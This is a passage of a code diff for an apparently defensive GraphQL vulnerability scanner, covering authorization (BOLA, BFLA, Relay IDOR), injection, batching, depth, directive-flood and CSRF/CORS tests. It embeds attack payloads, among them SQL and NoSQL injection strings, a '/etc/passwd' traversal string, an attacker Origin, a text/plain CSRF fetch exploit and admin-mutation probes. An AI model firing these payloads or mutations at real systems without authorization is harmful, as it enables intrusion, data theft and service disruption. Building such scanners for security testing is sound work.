-            evidence=f"Sensitive fields in schema: {', '.join(f['type'] + '.' + f['field'] for f in sensitive_fields[:10])}",
+            endpoint=ep.url, vuln_type="graphql_sensitive_fields",
+            category="introspection", severity="MEDIUM", confidence=80,
+            engine=ep.engine,
+            evidence=f"Sensitive fields: {', '.join(f['type'] + '.' + f['field'] for f in sensitive_fields[:10])}",
             details={"fields": sensitive_fields[:100]},
+            auth_enabled=auth_on, first_seen=now,
         ))
 
     if sensitive_mutations:
         findings.append(GraphQLFinding(
-            target=endpoint.url,
-            vuln_type="graphql_sensitive_mutations",
-            severity="MEDIUM",
-            confidence=75,
-            evidence=f"Admin-like mutations in schema: {', '.join(m['mutation'] for m in sensitive_mutations[:10])}",
+            endpoint=ep.url, vuln_type="graphql_sensitive_mutations",
+            category="introspection", severity="MEDIUM", confidence=75,
+            engine=ep.engine,
+            evidence=f"Admin-like mutations: {', '.join(m['mutation'] for m in sensitive_mutations[:10])}",
             details={"mutations": sensitive_mutations[:50]},
+            auth_enabled=auth_on, first_seen=now,
         ))
 
     if bola_args:
         findings.append(GraphQLFinding(
-            target=endpoint.url,
-            vuln_type="graphql_bola_surface",
-            severity="HIGH",
-            confidence=65,
-            evidence=f"BOLA argument surface: {len(bola_args)} field(s) accept id-like args",
+            endpoint=ep.url, vuln_type="graphql_bola_surface",
+            category="authz", severity="HIGH", confidence=65,
+            engine=ep.engine,
+            evidence=f"{len(bola_args)} field(s) accept id-like args (BOLA surface)",
             details={"bola_args": bola_args[:100]},
+            auth_enabled=auth_on, first_seen=now,
         ))
 
     return findings
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 4 — AUTHORIZATION TESTING (BOLA / BFLA / FIELD-LEVEL)
+#  PHASE 5 — AUTHORIZATION (BOLA / BFLA / Relay / Nested)
 # ═════════════════════════════════════════════════════════════════════════════
 
 def test_bola(
-    session: requests.Session,
-    endpoint: GraphQLEndpoint,
-    user_a_cookie: Optional[str] = None,
-    user_b_id: Optional[str] = None,
+    session: RateLimitedSession, ep: GraphQLEndpoint,
+    user_a_cookie: Optional[str], user_b_id: Optional[str], auth_on: bool,
 ) -> list[GraphQLFinding]:
-    """
-    Test BOLA by querying with User A's token for User B's data.
-
-    Requires:
-      • user_a_cookie — session/token for User A
-      • user_b_id     — the identifier of an object owned by User B
-
-    If either is missing, we can only surface the candidate (from schema).
-    """
     findings: list[GraphQLFinding] = []
-
-    if not endpoint.schema:
+    if not ep.schema:
         return findings
+    now = datetime.now(timezone.utc).isoformat()
 
-    # Extract BOLA args from schema
     bola_fields: list[dict] = []
-    for t in endpoint.schema.get("types", []):
+    for t in ep.schema.get("types", []):
         for f in t.get("fields") or []:
             for arg in f.get("args") or []:
                 aname = (arg.get("name") or "").lower()
-                if aname in ("id", "uuid", "user_id", "userid", "account_id", "email"):
-                    bola_fields.append({
-                        "type":   t.get("name"),
-                        "field":  f.get("name"),
-                        "arg":    arg.get("name"),
-                    })
+                if aname in ("id", "uuid", "user_id", "account_id", "email", "nodeid"):
+                    bola_fields.append({"type": t.get("name"), "field": f.get("name"), "arg": arg.get("name")})
 
     if not bola_fields:
         return findings
 
-    # If we have credentials, actually test
     if user_a_cookie and user_b_id:
         headers = {"Cookie": user_a_cookie}
         for bf in bola_fields[:10]:
-            # Build query: { user(id: "USER_B_ID") { email } }
-            # This is a heuristic; real testing depends on the schema structure.
-            query = f'{{ {bf["field"]}({bf["arg"]}: "{user_b_id}") {{ __typename }} }}'
-            resp = _graphql_post(session, endpoint.url, query, headers=headers)
-            if resp and _is_graphql_response(resp):
+            q = f'{{ {bf["field"]}({bf["arg"]}: "{user_b_id}") {{ __typename }} }}'
+            r = session.post_json(ep.url, {"query": q}, headers=headers)
+            if r and _is_graphql_response(r):
                 try:
-                    data = resp.json()
+                    data = r.json()
+                    if "data" in data and data["data"]:
+                        findings.append(GraphQLFinding(
+                            endpoint=ep.url, vuln_type="graphql_bola_confirmed",
+                            category="authz", severity="CRITICAL", confidence=85,
+                            engine=ep.engine,
+                            evidence=f"Query {bf['field']}({bf['arg']}={user_b_id}) returned data with User A session",
+                            query_payload=q,
+                            response_snippet=_body_text(r, 300),
+                            details=bf,
+                            auth_enabled=auth_on, first_seen=now,
+                        ))
                 except Exception:
-                    continue
-                if "data" in data and data["data"]:
-                    # Data returned for another user's ID = BOLA candidate
-                    findings.append(GraphQLFinding(
-                        target=endpoint.url,
-                        vuln_type="graphql_bola_candidate",
-                        severity="CRITICAL",
-                        confidence=85,
-                        evidence=f"Query for {bf['field']}({bf['arg']}={user_b_id}) returned data with User A's session",
-                        details={
-                            "type": bf["type"],
-                            "field": bf["field"],
-                            "arg": bf["arg"],
-                            "query": query,
-                            "response_snippet": _body_text(resp, 300),
-                        },
-                    ))
+                    pass
     else:
-        # Surface candidate without confirmation
         findings.append(GraphQLFinding(
-            target=endpoint.url,
-            vuln_type="graphql_bola_surface",
-            severity="HIGH",
-            confidence=55,
-            evidence=f"{len(bola_fields)} BOLA-suspect field(s); supply user_a_cookie and user_b_id to confirm",
+            endpoint=ep.url, vuln_type="graphql_bola_surface",
+            category="authz", severity="HIGH", confidence=55,
+            engine=ep.engine,
+            evidence=f"{len(bola_fields)} BOLA-suspect field(s); supply dual sessions to confirm",
             details={"bola_fields": bola_fields[:50]},
+            auth_enabled=auth_on, first_seen=now,
         ))
 
     return findings
 
 
-def test_bfla(
-    session: requests.Session,
-    endpoint: GraphQLEndpoint,
-    user_cookie: Optional[str] = None,
+def test_relay_node_idor(
+    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
 ) -> list[GraphQLFinding]:
     """
-    Test BFLA by attempting admin-like mutations with a regular user token.
+    Relay node interface IDOR. Decode Type:ID → base64 → enumerate.
+
+    Only active when we can see the node field in the schema.
     """
     findings: list[GraphQLFinding] = []
+    if not ep.schema:
+        return findings
+    now = datetime.now(timezone.utc).isoformat()
 
-    if not endpoint.schema:
+    # Check for node field
+    has_node = False
+    node_fields: list[str] = []
+    for t in ep.schema.get("types", []):
+        if t.get("name") == ep.schema.get("queryType", {}).get("name"):
+            for f in t.get("fields") or []:
+                if (f.get("name") or "").lower() == "node":
+                    has_node = True
+
+    if not has_node:
         return findings
 
-    # Find mutation type
-    mut_type_name = endpoint.schema.get("mutationType", {}).get("name")
-    if not mut_type_name:
-        return findings
+    # Probe node with a decoded/encoded base64 ID
+    test_id = _b64_encode("User:1")
+    q = f'{{ node(id: "{test_id}") {{ __typename }} }}'
+    r = session.post_json(ep.url, {"query": q})
 
-    mutations: list[dict] = []
-    for t in endpoint.schema.get("types", []):
-        if t.get("name") != mut_type_name:
-            continue
-        for f in t.get("fields") or []:
-            fname = (f.get("name") or "").lower()
-            if any(pat in fname for pat in SENSITIVE_MUTATION_PATTERNS):
-                mutations.append({
-                    "mutation": f.get("name"),
-                    "args":     [a.get("name") for a in (f.get("args") or [])],
-                })
-
-    if not mutations:
-        return findings
-
-    if user_cookie:
-        headers = {"Cookie": user_cookie}
-        for m in mutations[:5]:
-            # Heuristic mutation: mutation { deleteUser(id: "1") { __typename } }
-            args = ", ".join(f'{a}: "1"' for a in (m.get("args") or [])[:2])
-            query = f'mutation {{ {m["mutation"]}({args}) {{ __typename }} }}'
-            resp = _graphql_post(session, endpoint.url, query, headers=headers)
-            if resp and _is_graphql_response(resp):
-                try:
-                    data = resp.json()
-                except Exception:
-                    continue
-                # If data is non-null (not an auth error), mutation may have executed
-                if "data" in data and data["data"] and not data.get("errors"):
-                    findings.append(GraphQLFinding(
-                        target=endpoint.url,
-                        vuln_type="graphql_bfla_candidate",
-                        severity="HIGH",
-                        confidence=75,
-                        evidence=f"Regular user executed mutation {m['mutation']}",
-                        details={
-                            "mutation": m["mutation"],
-                            "query": query,
-                            "response_snippet": _body_text(resp, 300),
-                        },
-                    ))
-    else:
-        findings.append(GraphQLFinding(
-            target=endpoint.url,
-            vuln_type="graphql_bfla_surface",
-            severity="MEDIUM",
-            confidence=50,
-            evidence=f"{len(mutations)} admin-like mutation(s); supply user_cookie to confirm",
-            details={"mutations": mutations[:50]},
-        ))
-
-    return findings
-
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 5 — QUERY ABUSE DETECTION
-# ═════════════════════════════════════════════════════════════════════════════
-
-def test_batching(
-    session: requests.Session, endpoint: GraphQLEndpoint,
-) -> list[GraphQLFinding]:
-    """Detect array batching and alias batching support."""
-    findings: list[GraphQLFinding] = []
-
-    # ── Array batching ──────────────────────────────────────────────────────
-    array_body = [{"query": DISCOVERY_QUERY} for _ in range(MAX_BATCH_SIZE)]
-    try:
-        resp = session.post(
-            endpoint.url, json=array_body,
-            headers={"Content-Type": "application/json", "User-Agent": USER_AGENT},
-            timeout=DEFAULT_TIMEOUT, verify=False,
-        )
-        if resp.status_code == 200:
-            try:
-                data = resp.json()
-                if isinstance(data, list) and len(data) > 1:
-                    findings.append(GraphQLFinding(
-                        target=endpoint.url,
-                        vuln_type="graphql_array_batching",
-                        severity="MEDIUM",
-                        confidence=85,
-                        evidence=f"Array batching accepted {len(data)} operations in one request",
-                        details={"batch_size": len(data)},
-                    ))
-            except Exception:
-                pass
-    except requests.RequestException:
-        pass
-
-    # ── Alias batching ──────────────────────────────────────────────────────
-    aliases = " ".join(f'a{i}: __typename' for i in range(MAX_ALIAS_COUNT))
-    alias_query = f"{{ {aliases} }}"
-    resp = _graphql_post(session, endpoint.url, alias_query)
-    if resp and _is_graphql_response(resp):
+    if r and _is_graphql_response(r):
         try:
-            data = resp.json()
-            if "data" in data and data["data"] and len(data["data"]) >= MAX_ALIAS_COUNT:
+            data = r.json()
+            if data.get("data", {}).get("node"):
                 findings.append(GraphQLFinding(
-                    target=endpoint.url,
-                    vuln_type="graphql_alias_batching",
-                    severity="MEDIUM",
-                    confidence=80,
-                    evidence=f"Alias batching accepted {len(data['data'])} aliases in one request",
-                    details={"alias_count": len(data["data"])},
+                    endpoint=ep.url, vuln_type="graphql_relay_node_idor_surface",
+                    category="authz", severity="HIGH", confidence=70,
+                    engine=ep.engine,
+                    evidence="Relay node interface accepts base64-encoded Type:ID — enumerate for IDOR",
+                    query_payload=q,
+                    response_snippet=_body_text(r, 300),
+                    details={
+                        "decoded_id": "User:1",
+                        "test_queries": [
+                            f'{{ node(id: "{_b64_encode("User:2")}") {{ __typename }} }}',
+                            f'{{ node(id: "{_b64_encode("User:3")}") {{ __typename }} }}',
+                        ],
+                    },
+                    auth_enabled=auth_on, first_seen=now,
                 ))
         except Exception:
             pass
@@ -766,200 +876,586 @@ def test_batching(
     return findings
 
 
-def test_depth(
-    session: requests.Session, endpoint: GraphQLEndpoint,
+def test_nested_object_authz(
+    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
 ) -> list[GraphQLFinding]:
     """
-    Probe query depth limits. A finding requires measurable impact —
-    we measure baseline response time and compare against a deep query.
+    Detect potential nested-object authz gaps (traversal from own object to
+    other user's data). This surfaces candidates from the schema.
     """
     findings: list[GraphQLFinding] = []
-
-    # Baseline
-    t0 = time.monotonic()
-    baseline_resp = _graphql_post(session, endpoint.url, DISCOVERY_QUERY)
-    baseline_time = time.monotonic() - t0
-    if not baseline_resp or not _is_graphql_response(baseline_resp):
+    if not ep.schema:
         return findings
+    now = datetime.now(timezone.utc).isoformat()
 
-    # Deep query using __typename (safe, self-referential)
-    depth = MAX_DEPTH_PROBE
-    # Build a valid nested query using a known type if possible
-    # Fallback: use a recursive fragment pattern
-    deep_query = "{ __typename }"  # Start safe
-    if endpoint.schema:
-        # Try to find a self-referential type
-        for t in endpoint.schema.get("types", []):
+    # Find types with sensitive fields reachable from a non-sensitive one
+    gaps: list[dict] = []
+    for t in ep.schema.get("types", []):
+        tname = t.get("name", "")
+        if any(pat in tname.lower() for pat in SENSITIVE_TYPE_PATTERNS):
             for f in t.get("fields") or []:
                 ftype = f.get("type", {})
-                # Check if the field returns the same type (self-referential)
-                if ftype.get("name") == t.get("name"):
+                ftype_name = ftype.get("name") or ""
+                # Sensitive nested field
+                if any(pat in ftype_name.lower() for pat in SENSITIVE_TYPE_PATTERNS):
+                    gaps.append({
+                        "parent_type": tname,
+                        "field":       f.get("name"),
+                        "child_type":  ftype_name,
+                    })
+
+    if gaps:
+        findings.append(GraphQLFinding(
+            endpoint=ep.url, vuln_type="graphql_nested_authz_surface",
+            category="authz", severity="MEDIUM", confidence=45,
+            engine=ep.engine,
+            evidence=f"{len(gaps)} sensitive nested relationship(s) — test ownership inheritance manually",
+            details={"gaps": gaps[:50]},
+            auth_enabled=auth_on, first_seen=now,
+        ))
+
+    return findings
+
+
+def test_bfla(
+    session: RateLimitedSession, ep: GraphQLEndpoint,
+    user_cookie: Optional[str], auth_on: bool,
+) -> list[GraphQLFinding]:
+    findings: list[GraphQLFinding] = []
+    if not ep.schema:
+        return findings
+    now = datetime.now(timezone.utc).isoformat()
+
+    mut_type_name = ep.schema.get("mutationType", {}).get("name")
+    if not mut_type_name:
+        return findings
+
+    mutations: list[dict] = []
+    for t in ep.schema.get("types", []):
+        if t.get("name") != mut_type_name:
+            continue
+        for f in t.get("fields") or []:
+            fname = (f.get("name") or "").lower()
+            if any(pat in fname for pat in SENSITIVE_MUTATION_PATTERNS):
+                mutations.append({"mutation": f.get("name"), "args": [a.get("name") for a in (f.get("args") or [])]})
+
+    if not mutations:
+        return findings
+
+    if user_cookie:
+        headers = {"Cookie": user_cookie}
+        for m in mutations[:5]:
+            args = ", ".join(f'{a}: "1"' for a in (m.get("args") or [])[:2])
+            q = f'mutation {{ {m["mutation"]}({args}) {{ __typename }} }}'
+            r = session.post_json(ep.url, {"query": q}, headers=headers)
+            if r and _is_graphql_response(r):
+                try:
+                    data = r.json()
+                    if "data" in data and data["data"] and not data.get("errors"):
+                        findings.append(GraphQLFinding(
+                            endpoint=ep.url, vuln_type="graphql_bfla_confirmed",
+                            category="authz", severity="HIGH", confidence=75,
+                            engine=ep.engine,
+                            evidence=f"Regular user executed mutation {m['mutation']}",
+                            query_payload=q,
+                            response_snippet=_body_text(r, 300),
+                            auth_enabled=auth_on, first_seen=now,
+                        ))
+                except Exception:
+                    pass
+    else:
+        findings.append(GraphQLFinding(
+            endpoint=ep.url, vuln_type="graphql_bfla_surface",
+            category="authz", severity="MEDIUM", confidence=50,
+            engine=ep.engine,
+            evidence=f"{len(mutations)} admin-like mutation(s); supply user_cookie to confirm",
+            details={"mutations": mutations[:50]},
+            auth_enabled=auth_on, first_seen=now,
+        ))
+
+    return findings
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  PHASE 6 — INJECTION TESTING (variables + args, 6 classes)
+# ═════════════════════════════════════════════════════════════════════════════
+
+def test_injection(
+    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
+) -> list[GraphQLFinding]:
+    findings: list[GraphQLFinding] = []
+    if not ep.schema:
+        return findings
+    now = datetime.now(timezone.utc).isoformat()
+
+    # Extract injectable string/ID args
+    args: list[dict] = []
+    for t in ep.schema.get("types", []):
+        for f in t.get("fields") or []:
+            for arg in f.get("args") or []:
+                atype = (arg.get("type") or {}).get("name") or ""
+                if atype in ("String", "ID", "URL", "JSON"):
+                    args.append({
+                        "type": t.get("name"),
+                        "field": f.get("name"),
+                        "arg": arg.get("name"),
+                    })
+
+    if not args:
+        return findings
+
+    # Probe each arg with each payload class (capped)
+    for arg in args[:5]:
+        for cls, payloads in INJECTION_PAYLOADS.items():
+            for payload in payloads[:2]:
+                # Escape payload for GraphQL string literal
+                escaped = payload.replace("\\", "\\\\").replace('"', '\\"')
+                q = f'{{ {arg["field"]}({arg["arg"]}: "{escaped}") {{ __typename }} }}'
+                r = session.post_json(ep.url, {"query": q})
+                if not r:
+                    continue
+                body = r.text
+
+                # Check for PII leak (SSRF, path traversal, etc.)
+                has_pii, hits = _has_pii(body)
+                if has_pii:
+                    findings.append(GraphQLFinding(
+                        endpoint=ep.url,
+                        vuln_type=f"graphql_injection_{cls}_confirmed",
+                        category="injection",
+                        severity="CRITICAL",
+                        confidence=90,
+                        engine=ep.engine,
+                        evidence=f"{cls} payload on {arg['field']}({arg['arg']}) leaked: {', '.join(hits[:3])}",
+                        query_payload=q,
+                        response_snippet=_body_text(r, 300),
+                        details={"class": cls, "payload": payload, "leaked": hits},
+                        auth_enabled=auth_on, first_seen=now,
+                    ))
+                    break
+
+                # Check for error leakage
+                for pattern in ERROR_LEAK_PATTERNS:
+                    if re.search(pattern, body, re.I):
+                        findings.append(GraphQLFinding(
+                            endpoint=ep.url,
+                            vuln_type=f"graphql_injection_{cls}_error",
+                            category="injection",
+                            severity="HIGH",
+                            confidence=75,
+                            engine=ep.engine,
+                            evidence=f"{cls} payload on {arg['field']}({arg['arg']}) triggered error leak",
+                            query_payload=q,
+                            response_snippet=_body_text(r, 300),
+                            details={"class": cls, "payload": payload, "pattern": pattern},
+                            auth_enabled=auth_on, first_seen=now,
+                        ))
+                        break
+
+    # ── NoSQLi via JSON variable (filter injection) ─────────────────────────
+    for arg in args[:3]:
+        if (arg.get("type") or "").lower() not in ("json", "string"):
+            continue
+        for payload in ["{\"$ne\":null}", "{\"$gt\":\"\"}", "{\"$regex\":\".*\"}"]:
+            variables = {arg["arg"]: json.loads(payload)}
+            q = f'query Test($v: {arg["type"]}) {{ {arg["field"]}({arg["arg"]}: $v) {{ __typename }} }}'
+            r = session.post_json(ep.url, {"query": q, "variables": variables})
+            if not r:
+                continue
+            for pattern in ERROR_LEAK_PATTERNS + ["mongo", "cast to ObjectId"]:
+                if re.search(pattern, r.text, re.I):
+                    findings.append(GraphQLFinding(
+                        endpoint=ep.url,
+                        vuln_type="graphql_injection_nosqli_variable",
+                        category="injection", severity="HIGH", confidence=80,
+                        engine=ep.engine,
+                        evidence=f"NoSQLi via variable on {arg['field']}({arg['arg']}): {payload}",
+                        query_payload=q,
+                        response_snippet=_body_text(r, 300),
+                        details={"arg": arg, "payload": payload},
+                        auth_enabled=auth_on, first_seen=now,
+                    ))
+                    break
+
+    return findings
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  PHASE 7 — QUERY ABUSE
+# ═════════════════════════════════════════════════════════════════════════════
+
+def test_batching(session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool) -> list[GraphQLFinding]:
+    findings: list[GraphQLFinding] = []
+    now = datetime.now(timezone.utc).isoformat()
+
+    # ── Array batching ──────────────────────────────────────────────────────
+    array_body = [{"query": DISCOVERY_QUERY} for _ in range(MAX_BATCH_SIZE)]
+    r = session.post_json(ep.url, array_body)
+    if r and r.status_code == 200:
+        try:
+            data = r.json()
+            if isinstance(data, list) and len(data) > 1:
+                findings.append(GraphQLFinding(
+                    endpoint=ep.url, vuln_type="graphql_array_batching",
+                    category="dos", severity="MEDIUM", confidence=85,
+                    engine=ep.engine,
+                    evidence=f"Array batching accepted {len(data)} operations in one request",
+                    details={"batch_size": len(data)},
+                    auth_enabled=auth_on, first_seen=now,
+                ))
+        except Exception:
+            pass
+
+    # ── Alias batching ──────────────────────────────────────────────────────
+    aliases = " ".join(f'a{i}: __typename' for i in range(MAX_ALIAS_COUNT))
+    q = f"{{ {aliases} }}"
+    r = session.post_json(ep.url, {"query": q})
+    if r and _is_graphql_response(r):
+        try:
+            data = r.json()
+            if "data" in data and data["data"] and len(data["data"]) >= MAX_ALIAS_COUNT:
+                findings.append(GraphQLFinding(
+                    endpoint=ep.url, vuln_type="graphql_alias_batching",
+                    category="dos", severity="MEDIUM", confidence=80,
+                    engine=ep.engine,
+                    evidence=f"Alias batching accepted {len(data['data'])} aliases in one request",
+                    query_payload=q,
+                    details={"alias_count": len(data["data"])},
+                    auth_enabled=auth_on, first_seen=now,
+                ))
+        except Exception:
+            pass
+
+    return findings
+
+
+def test_depth(session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool) -> list[GraphQLFinding]:
+    findings: list[GraphQLFinding] = []
+    now = datetime.now(timezone.utc).isoformat()
+
+    t0 = time.monotonic()
+    baseline = session.post_json(ep.url, {"query": DISCOVERY_QUERY})
+    baseline_time = time.monotonic() - t0
+    if not baseline or not _is_graphql_response(baseline):
+        return findings
+
+    # Build deep query if self-referential field exists
+    depth = MAX_DEPTH_PROBE
+    deep_query = "{ __typename }"
+    if ep.schema:
+        for t in ep.schema.get("types", []):
+            for f in t.get("fields") or []:
+                if (f.get("type") or {}).get("name") == t.get("name"):
                     field_name = f.get("name")
-                    nested = "{" + field_name + " " * 0
-                    # Build depth
-                    q = "{ " + " ".join(["__typename"] * 1) + " }"
-                    # Simpler: just use a known deep pattern
                     deep_query = "{ " + (f"{field_name} {{ " * depth) + "__typename" + (" }" * depth) + " }"
                     break
             if deep_query != "{ __typename }":
                 break
 
     if deep_query == "{ __typename }":
-        # Cannot build a deep query without schema — skip
         return findings
 
     t0 = time.monotonic()
-    deep_resp = _graphql_post(session, endpoint.url, deep_query, timeout=30)
+    deep = session.post_json(ep.url, {"query": deep_query})
     deep_time = time.monotonic() - t0
-
-    if not deep_resp or not _is_graphql_response(deep_resp):
+    if not deep or not _is_graphql_response(deep):
         return findings
 
     delta = deep_time - baseline_time
     if delta >= DEPTH_IMPACT_THRESHOLD:
         findings.append(GraphQLFinding(
-            target=endpoint.url,
-            vuln_type="graphql_depth_impact",
-            severity="MEDIUM",
-            confidence=70,
-            evidence=f"Depth {depth} query took {deep_time:.2f}s vs baseline {baseline_time:.2f}s (delta {delta:.2f}s)",
-            details={
-                "depth": depth,
-                "baseline_seconds": round(baseline_time, 3),
-                "deep_seconds": round(deep_time, 3),
-                "delta_seconds": round(delta, 3),
-                "query": deep_query[:300],
-            },
+            endpoint=ep.url, vuln_type="graphql_depth_impact",
+            category="dos", severity="MEDIUM", confidence=70,
+            engine=ep.engine,
+            evidence=f"Depth {depth} took {deep_time:.2f}s vs baseline {baseline_time:.2f}s (Δ {delta:.2f}s)",
+            query_payload=deep_query[:500],
+            details={"depth": depth, "baseline": round(baseline_time, 3), "deep": round(deep_time, 3), "delta": round(delta, 3)},
+            auth_enabled=auth_on, first_seen=now,
         ))
-    else:
-        # No measurable impact — surface only, do not report as finding
-        log.debug(f"    Depth {depth} completed in {deep_time:.2f}s (no significant impact)")
 
     return findings
 
 
-# ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 6 — INJECTION SURFACE & ERROR LEAKAGE
-# ═════════════════════════════════════════════════════════════════════════════
-
-INJECTION_PAYLOADS = [
-    "' OR '1'='1", "\" OR \"1\"=\"1", "') OR ('1'='1",
-    "1; SELECT 1", "1' AND SLEEP(0)--", "\" AND 1=1--",
-    "../../../etc/passwd", "{{7*7}}", "${7*7}",
-]
-
-
-def test_injection_surface(
-    session: requests.Session, endpoint: GraphQLEndpoint,
-) -> list[GraphQLFinding]:
+def test_negative_limit(session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool) -> list[GraphQLFinding]:
     """
-    Identify injectable arguments from the schema and send benign
-    error-triggering payloads. Flag arguments where the response
-    contains database errors or stack traces.
+    Negative-limit bypass (Keystone maxTake pattern). Some servers use maxTake
+    to cap results, but negative take returns ALL rows.
     """
     findings: list[GraphQLFinding] = []
-
-    if not endpoint.schema:
+    if not ep.schema:
         return findings
+    now = datetime.now(timezone.utc).isoformat()
 
-    # Find string arguments
-    injectable_args: list[dict] = []
-    for t in endpoint.schema.get("types", []):
+    # Find fields with Int limit/take/first args
+    for t in ep.schema.get("types", []):
         for f in t.get("fields") or []:
             for arg in f.get("args") or []:
-                arg_type = arg.get("type", {})
-                # String-ish types
-                if arg_type.get("name") in ("String", "ID"):
-                    injectable_args.append({
-                        "type":  t.get("name"),
-                        "field": f.get("name"),
-                        "arg":   arg.get("name"),
-                    })
+                aname = (arg.get("name") or "").lower()
+                atype = (arg.get("type") or {}).get("name") or ""
+                if aname in ("take", "limit", "first") and atype == "Int":
+                    q = f'{{ {f.get("name")}({arg.get("name")}: -1) {{ __typename }} }}'
+                    r = session.post_json(ep.url, {"query": q})
+                    if r and _is_graphql_response(r):
+                        try:
+                            data = r.json()
+                            if "data" in data and data["data"] and not data.get("errors"):
+                                findings.append(GraphQLFinding(
+                                    endpoint=ep.url,
+                                    vuln_type="graphql_negative_limit_bypass",
+                                    category="dos", severity="MEDIUM", confidence=60,
+                                    engine=ep.engine,
+                                    evidence=f"{f.get('name')}({arg.get('name')}: -1) accepted — bypasses max cap",
+                                    query_payload=q,
+                                    response_snippet=_body_text(r, 300),
+                                    details={"field": f.get("name"), "arg": arg.get("name")},
+                                    auth_enabled=auth_on, first_seen=now,
+                                ))
+                        except Exception:
+                            pass
+                    break
 
-    if not injectable_args:
-        return findings
+    return findings
 
-    # Send benign payloads and check for error leakage
-    for arg in injectable_args[:5]:
-        for payload in INJECTION_PAYLOADS[:3]:
-            query = f'{{ {arg["field"]}({arg["arg"]}: "{payload}") {{ __typename }} }}'
-            resp = _graphql_post(session, endpoint.url, query)
-            if not resp:
-                continue
-            body = resp.text
-            # Check for error leakage patterns
-            for pattern in ERROR_LEAK_PATTERNS:
-                if re.search(pattern, body, re.I):
-                    findings.append(GraphQLFinding(
-                        target=endpoint.url,
-                        vuln_type="graphql_error_leakage",
-                        severity="MEDIUM",
-                        confidence=75,
-                        evidence=f"Error leakage on {arg['field']}({arg['arg']}) with payload {payload[:30]}",
-                        details={
-                            "type": arg["type"],
-                            "field": arg["field"],
-                            "arg": arg["arg"],
-                            "payload": payload,
-                            "leaked_pattern": pattern,
-                            "response_snippet": _body_text(resp, 300),
-                        },
-                    ))
-                    break  # one leak per arg is enough
+
+def test_directive_flood(session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool) -> list[GraphQLFinding]:
+    """
+    Directive flooding (CVE-2024-47614 async-graphql). Attach thousands of
+    @include(if:true) directives to a single field.
+    """
+    findings: list[GraphQLFinding] = []
+    now = datetime.now(timezone.utc).isoformat()
+
+    directives = " ".join(["@include(if: true)"] * MAX_DIRECTIVE_FLOOD)
+    q = f'{{ __typename {directives} }}'
+    t0 = time.monotonic()
+    r = session.post_json(ep.url, {"query": q}, )
+    elapsed = time.monotonic() - t0
+
+    if r is None:
+        # Connection died — likely crashed the parser
+        findings.append(GraphQLFinding(
+            endpoint=ep.url, vuln_type="graphql_directive_flood_crash",
+            category="dos", severity="HIGH", confidence=60,
+            engine=ep.engine,
+            evidence=f"Connection dropped after {MAX_DIRECTIVE_FLOOD} @include directives (potential CVE-2024-47614)",
+            query_payload=q[:500],
+            details={"flood_size": MAX_DIRECTIVE_FLOOD, "elapsed": round(elapsed, 2)},
+            auth_enabled=auth_on, first_seen=now,
+        ))
+    elif elapsed > 3.0:
+        findings.append(GraphQLFinding(
+            endpoint=ep.url, vuln_type="graphql_directive_flood_slow",
+            category="dos", severity="MEDIUM", confidence=55,
+            engine=ep.engine,
+            evidence=f"{MAX_DIRECTIVE_FLOOD} directives caused {elapsed:.1f}s delay",
+            query_payload=q[:500],
+            details={"flood_size": MAX_DIRECTIVE_FLOOD, "elapsed": round(elapsed, 2)},
+            auth_enabled=auth_on, first_seen=now,
+        ))
 
     return findings
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 7 — CSRF / CORS / TRANSPORT
+#  PHASE 8 — CSRF / TRANSPORT
 # ═════════════════════════════════════════════════════════════════════════════
 
 def test_csrf_cors(
-    session: requests.Session, endpoint: GraphQLEndpoint,
+    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
 ) -> list[GraphQLFinding]:
-    """
-    Test:
-      • GET-based GraphQL (CSRF surface)
-      • Missing CSRF token on mutations
-      • CORS misconfiguration
-    """
     findings: list[GraphQLFinding] = []
+    now = datetime.now(timezone.utc).isoformat()
 
-    # ── GET-based GraphQL ───────────────────────────────────────────────────
-    if endpoint.get_supported:
+    # ── GET support ─────────────────────────────────────────────────────────
+    if ep.get_supported:
+        # Try a mutation via GET — if accepted, CSRF is trivial
+        mut_test = 'mutation { __typename }'
+        r = session.get(ep.url, params={"query": mut_test})
+        mutation_via_get = r and _is_graphql_response(r) and "errors" not in (r.json() or {})
+
         findings.append(GraphQLFinding(
-            target=endpoint.url,
-            vuln_type="graphql_get_method",
-            severity="MEDIUM",
-            confidence=70,
-            evidence="GraphQL endpoint accepts GET requests — potential CSRF surface",
-            details={"note": "Verify whether mutations are also accepted via GET"},
+            endpoint=ep.url,
+            vuln_type="graphql_get_mutation_accept" if mutation_via_get else "graphql_get_query_accept",
+            category="csrf",
+            severity="HIGH" if mutation_via_get else "MEDIUM",
+            confidence=85 if mutation_via_get else 60,
+            engine=ep.engine,
+            evidence=("GET accepts mutations — CSRF via simple <img> tag" if mutation_via_get
+                     else "GET accepts queries — potential CSRF read surface"),
+            details={"get_url": f"{ep.url}?query={urllib.parse.quote(mut_test)}"},
+            auth_enabled=auth_on, first_seen=now,
+        ))
+
+    # ── text/plain bypass ───────────────────────────────────────────────────
+    if ep.text_plain_supported:
+        findings.append(GraphQLFinding(
+            endpoint=ep.url, vuln_type="graphql_text_plain_csrf_bypass",
+            category="csrf", severity="HIGH", confidence=80,
+            engine=ep.engine,
+            evidence="Endpoint accepts Content-Type: text/plain — CSRF preflight bypass",
+            details={
+                "exploit": "fetch(url, {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body: JSON.stringify({query:'mutation{...}'})})",
+            },
+            auth_enabled=auth_on, first_seen=now,
         ))
 
     # ── CORS ────────────────────────────────────────────────────────────────
-    # Send with an attacker Origin and check reflection
     attacker_origin = "https://evil-argus.example"
-    try:
-        resp = session.options(
-            endpoint.url,
-            headers={"Origin": attacker_origin, "Access-Control-Request-Method": "POST"},
-            timeout=DEFAULT_TIMEOUT, verify=False,
-        )
-        acao = resp.headers.get("Access-Control-Allow-Origin", "")
